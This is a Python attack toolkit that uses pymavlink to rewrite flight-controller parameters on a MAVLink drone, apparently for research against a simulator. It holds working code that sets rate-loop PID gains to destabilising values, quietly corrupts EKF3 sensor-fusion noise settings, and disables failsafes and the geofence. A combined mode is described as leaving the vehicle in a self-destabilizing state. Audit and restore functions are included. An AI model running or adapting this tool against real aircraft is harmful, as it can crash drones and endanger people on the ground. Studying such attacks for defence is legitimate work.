"""
MAVLink Parameter Manipulation Attack Toolkit

Implements the control-aware attacks from arXiv 2606.22289:
- PID gain manipulation (rate loop destabilization)
- EKF confusion (stealthy sensor fusion corruption)
- Failsafe bypass (disable safety mechanisms)
- Combined multi-layer attack

Usage:
    # Against SITL:
    python3 mavlink_param_attack.py --connection udp:127.0.0.1:14550 --attack audit
    python3 mavlink_param_attack.py --connection udp:127.0.0.1:14550 --attack pid-corrupt
    python3 mavlink_param_attack.py --connection udp:127.0.0.1:14550 --attack ekf-confuse
    python3 mavlink_param_attack.py --connection udp:127.0.0.1:14550 --attack failsafe-disable
    python3 mavlink_param_attack.py --connection udp:127.0.0.1:14550 --attack restore

For authorized security research only.
"""

import argparse
import time
import sys
import json
from pymavlink import mavutil


# Parameter groups for different attack classes
PID_PARAMS = {
    'ATC_RAT_RLL_P': {'desc': 'Roll rate P', 'safe': 0.135, 'attack': 5.0},
    'ATC_RAT_RLL_I': {'desc': 'Roll rate I', 'safe': 0.135, 'attack': 0.0},
    'ATC_RAT_RLL_D': {'desc': 'Roll rate D', 'safe': 0.0036, 'attack': 0.5},
    'ATC_RAT_PIT_P': {'desc': 'Pitch rate P', 'safe': 0.135, 'attack': 5.0},
    'ATC_RAT_PIT_I': {'desc': 'Pitch rate I', 'safe': 0.135, 'attack': 0.0},
    'ATC_RAT_PIT_D': {'desc': 'Pitch rate D', 'safe': 0.0036, 'attack': 0.5},
    'ATC_RAT_YAW_P': {'desc': 'Yaw rate P', 'safe': 0.18, 'attack': 5.0},
    'ATC_RAT_YAW_I': {'desc': 'Yaw rate I', 'safe': 0.018, 'attack': 0.0},
    'ATC_RAT_YAW_D': {'desc': 'Yaw rate D', 'safe': 0.0, 'attack': 0.5},
}

EKF_PARAMS = {
    'EK3_POSNE_M_NSE': {'desc': 'EKF3 position noise', 'safe': 0.5, 'attack': 100.0},
    'EK3_VELNE_M_NSE': {'desc': 'EKF3 velocity noise', 'safe': 0.5, 'attack': 100.0},
    'EK3_VELD_M_NSE': {'desc': 'EKF3 vertical vel noise', 'safe': 0.7, 'attack': 100.0},
    'EK3_ALT_M_NSE': {'desc': 'EKF3 altitude noise', 'safe': 2.0, 'attack': 100.0},
    'EK3_GYRO_P_NSE': {'desc': 'EKF3 gyro process noise', 'safe': 0.001, 'attack': 10.0},
    'EK3_ACC_P_NSE': {'desc': 'EKF3 accel process noise', 'safe': 0.25, 'attack': 50.0},
    'EK3_GPS_CHECK': {'desc': 'EKF3 GPS consistency check', 'safe': 31, 'attack': 0},
}

FAILSAFE_PARAMS = {
    'FS_THR_ENABLE': {'desc': 'Throttle failsafe', 'safe': 1, 'attack': 0},
    'FS_GCS_ENABLE': {'desc': 'GCS failsafe', 'safe': 1, 'attack': 0},
    'FS_EKF_ACTION': {'desc': 'EKF failsafe action', 'safe': 1, 'attack': 0},
    'FS_EKF_THRESH': {'desc': 'EKF failsafe threshold', 'safe': 0.8, 'attack': 10.0},
    'FS_CRASH_CHECK': {'desc': 'Crash check', 'safe': 1, 'attack': 0},
    'FENCE_ENABLE': {'desc': 'Geofence enable', 'safe': 1, 'attack': 0},
    'FENCE_ACTION': {'desc': 'Geofence breach action', 'safe': 1, 'attack': 0},
}


class ParamAttack:
    def __init__(self, connection_string, baud=57600):
        self.conn_str = connection_string
        self.baud = baud
        self.conn = None
        self.target_system = 1
        self.target_component = 1
        self.original_values = {}

    def connect(self):
        print(f"[*] Connecting to {self.conn_str}...")
        self.conn = mavutil.mavlink_connection(self.conn_str, baud=self.baud)
        msg = self.conn.wait_heartbeat(timeout=30)
        if msg:
            self.target_system = msg.get_srcSystem()
            self.target_component = msg.get_srcComponent()
            print(f"[+] Connected (sys={self.target_system} comp={self.target_component})")
            return True
        return False

    def read_param(self, name):
        """Read a single parameter."""
        param_id = name.encode('ascii')[:16].ljust(16, b'\x00')
        self.conn.mav.param_request_read_send(
            self.target_system, self.target_component, param_id, -1)

        msg = self.conn.recv_match(type='PARAM_VALUE', blocking=True, timeout=5)
        if msg and msg.param_id.rstrip('\x00') == name:
            return msg.param_value
        return None

    def set_param(self, name, value):
        """Set a single parameter."""
        param_id = name.encode('ascii')[:16].ljust(16, b'\x00')
        self.conn.mav.param_set_send(
            self.target_system, self.target_component,
            param_id, float(value), mavutil.mavlink.MAV_PARAM_TYPE_REAL32)

        msg = self.conn.recv_match(type='PARAM_VALUE', blocking=True, timeout=5)
        if msg:
            return msg.param_value
        return None

    def save_originals(self, param_group):
        """Save original parameter values before modification."""
        print("[*] Saving original parameter values...")
        for name in param_group:
            val = self.read_param(name)
            if val is not None:
                self.original_values[name] = val
                print(f"    {name} = {val}")
            time.sleep(0.1)

    def audit(self):
        """Audit current security-relevant parameter values."""
        print("\n" + "=" * 70)
        print("SECURITY PARAMETER AUDIT")
        print("=" * 70)

        all_params = {}
        all_params.update(PID_PARAMS)
        all_params.update(EKF_PARAMS)
        all_params.update(FAILSAFE_PARAMS)

        findings = []

        for name, info in all_params.items():
            val = self.read_param(name)
            time.sleep(0.05)
            if val is None:
                status = "NOT FOUND"
                indicator = "?"
            else:
                if name in FAILSAFE_PARAMS:
                    if val == info['attack']:
                        status = "VULNERABLE (disabled)"
                        indicator = "!"
                        findings.append(f"{name} is disabled ({val})")
                    else:
                        status = "OK"
                        indicator = "+"
                else:
                    status = f"value={val}"
                    indicator = " "

            print(f"  [{indicator}] {name:25s} = {val if val is not None else 'N/A':>10} "
                  f"(safe={info['safe']}) — {info['desc']}")

        if findings:
            print(f"\n[!] {len(findings)} security finding(s):")
            for f in findings:
                print(f"    - {f}")
        else:
            print("\n[+] No immediate security findings in default configuration")

        return findings

    def attack_pid(self, gradual=False):
        """PID gain manipulation attack — destabilize rate controllers."""
        print("\n[!] PID GAIN MANIPULATION ATTACK")
        print("    Effect: Rate controller destabilization → oscillation → potential crash")

        self.save_originals(PID_PARAMS)

        for name, info in PID_PARAMS.items():
            if gradual:
                current = self.original_values.get(name, info['safe'])
                steps = 5
                delta = (info['attack'] - current) / steps
                for i in range(steps):
                    intermediate = current + delta * (i + 1)
                    result = self.set_param(name, intermediate)
                    print(f"    {name} → {intermediate:.4f} (step {i+1}/{steps})")
                    time.sleep(0.5)
            else:
                result = self.set_param(name, info['attack'])
                print(f"    {name}: {self.original_values.get(name, '?')} → {info['attack']}"
                      f" (confirmed: {result})")
            time.sleep(0.1)

        print("[+] PID gains corrupted")

    def attack_ekf(self):
        """EKF confusion attack — corrupt sensor fusion (stealthy)."""
        print("\n[!] EKF CONFUSION ATTACK (STEALTHY)")
        print("    Effect: Sensor fusion corruption — attitude monitoring shows no anomaly")

        self.save_originals(EKF_PARAMS)

        for name, info in EKF_PARAMS.items():
            result = self.set_param(name, info['attack'])
            print(f"    {name}: {self.original_values.get(name, '?')} → {info['attack']}"
                  f" (confirmed: {result})")
            time.sleep(0.1)

        print("[+] EKF parameters corrupted — sensor fusion will degrade over time")
        print("    Note: This attack is stealthy; attitude panels may show no immediate change")

    def attack_failsafes(self):
        """Disable all failsafe mechanisms."""
        print("\n[!] FAILSAFE DISABLE ATTACK")
        print("    Effect: Safety mechanisms disabled — vehicle will not auto-land/RTL on failure")

        self.save_originals(FAILSAFE_PARAMS)

        for name, info in FAILSAFE_PARAMS.items():
            result = self.set_param(name, info['attack'])
            print(f"    {name}: {self.original_values.get(name, '?')} → {info['attack']}"
                  f" (confirmed: {result})")
            time.sleep(0.1)

        print("[+] All failsafes disabled")

    def attack_combined(self):
        """Combined multi-layer attack — EKF + PID + failsafe bypass."""
        print("\n[!] COMBINED MULTI-LAYER ATTACK")
        print("    Effect: Self-destabilizing state that persists after attacker disconnects")

        self.attack_failsafes()
        time.sleep(1)
        self.attack_ekf()
        time.sleep(1)
        self.attack_pid()

        print("\n[+] Combined attack deployed — vehicle is in self-destabilizing state")

    def restore(self):
        """Restore all parameters to safe defaults."""
        print("\n[*] RESTORING SAFE PARAMETERS")

        all_params = {}
        all_params.update(PID_PARAMS)
        all_params.update(EKF_PARAMS)
        all_params.update(FAILSAFE_PARAMS)

        for name, info in all_params.items():
            safe = self.original_values.get(name, info['safe'])
            result = self.set_param(name, safe)
            print(f"    {name} → {safe} (confirmed: {result})")
            time.sleep(0.1)

        print("[+] Parameters restored to safe values")


def main():
    parser = argparse.ArgumentParser(description='MAVLink Parameter Attack Toolkit')
    parser.add_argument('--connection', '-c', default='udp:127.0.0.1:14550')
    parser.add_argument('--baud', '-b', type=int, default=57600)
    parser.add_argument('--attack', '-a', required=True,
                        choices=['audit', 'pid-corrupt', 'pid-gradual',
                                 'ekf-confuse', 'failsafe-disable',
                                 'combined', 'restore'])

    args = parser.parse_args()

    attacker = ParamAttack(args.connection, args.baud)
    if not attacker.connect():
        sys.exit(1)

    if args.attack == 'audit':
        attacker.audit()
    elif args.attack == 'pid-corrupt':
        attacker.attack_pid()
    elif args.attack == 'pid-gradual':
        attacker.attack_pid(gradual=True)
    elif args.attack == 'ekf-confuse':
        attacker.attack_ekf()
    elif args.attack == 'failsafe-disable':
        attacker.attack_failsafes()
    elif args.attack == 'combined':
        attacker.attack_combined()
    elif args.attack == 'restore':
        attacker.restore()


if __name__ == '__main__':
    main()
